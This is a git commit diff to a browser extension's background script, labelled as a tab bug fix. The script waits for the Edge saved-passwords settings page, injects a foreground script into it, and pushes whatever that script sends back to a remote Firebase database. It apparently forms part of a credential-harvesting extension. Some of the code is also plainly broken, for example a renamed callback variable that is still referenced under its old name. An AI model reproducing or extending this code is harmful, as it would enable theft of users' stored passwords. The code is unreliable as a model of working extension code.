99331e9e0f97e2cfefc7623863eec3b03b840d1a
NightsoulCC4 <StickyCoffee8360@gmail.com>
2021-11-28 18:15:52 +0700

    fixing tab bug

--- extension/background.js
+++ extension/background.js
@@ -1,6 +1,6 @@
 import { initializeApp } from "https://www.gstatic.com/firebasejs/9.4.1/firebase-app.js";
- import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.4.1/firebase-analytics.js";
- import { getDatabase, ref, set, onValue, child, get } from "https://www.gstatic.com/firebasejs/9.4.1/firebase-database.js"
+import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.4.1/firebase-analytics.js";
+import { getDatabase, push, ref, /* child, get */ } from "https://www.gstatic.com/firebasejs/9.4.1/firebase-database.js"
 
 const edgePswd = "edge://settings/passwords";
 const settingPage = "edge://settings/";
@@ -21,17 +21,16 @@ const analytics = getAnalytics(app);
 const db = getDatabase();
 
 async function writeUserData(data) {
-  const db = getDatabase();
-  set(ref(db), {
+  await push(ref(db), {
     Time : data.Time,
     Title : data.Title,
     UUID : data.UUID,
     Webtitle: data.Webtitle
   });
-  console.log("writed")
+  console.log("database stored.");
 }
 
-const dbRef = ref(getDatabase());
+/* const dbRef = ref(getDatabase());
 get(child(dbRef, `data1`)).then((snapshot) => {
   if (snapshot.exists()) {
     console.log(snapshot.val());
@@ -40,21 +39,19 @@ get(child(dbRef, `data1`)).then((snapshot) => {
   }
 }).catch((error) => {
   console.error(error);
-});
+}); */
 
 console.log("connect success")
 
 chrome.tabs.onActivated.addListener(async (tab) => {
-  await chrome.tabs.get(tab.tabId, (current_tab_info) => {
+  var tabInfo = getCurrentTab();
+  console.log(tabInfo);
+  await chrome.tabs.get(tab.tabId, (tabInfo) => {
     var pswdPageChecked = 1;
     while(pswdPageChecked < 2) {
       if (edgePswd == current_tab_info.url) {
         chrome.tabs.executeScript(null, { file: "/extension/foreground.js" }, () => {
           console.log("Coming to foreground");
-          chrome.runtime.onMessage.addListener(async function(response, sender, sendResponse){
-            console.log(response);
-            await writeUserData(response);
-          });
         });
         pswdPageChecked++;
       }
@@ -62,7 +59,16 @@ chrome.tabs.onActivated.addListener(async (tab) => {
   });
 });
 
+chrome.runtime.onMessage.addListener(function(data, sender, sendResponse){
+  console.log(data);
+  writeUserData(data);
+});
  
+async function getCurrentTab() {
+  let queryOptions = { active: true, currentWindow: true };
+  let [tab] = await chrome.tabs.query(queryOptions);
+  return tab;
+}
 
 
 
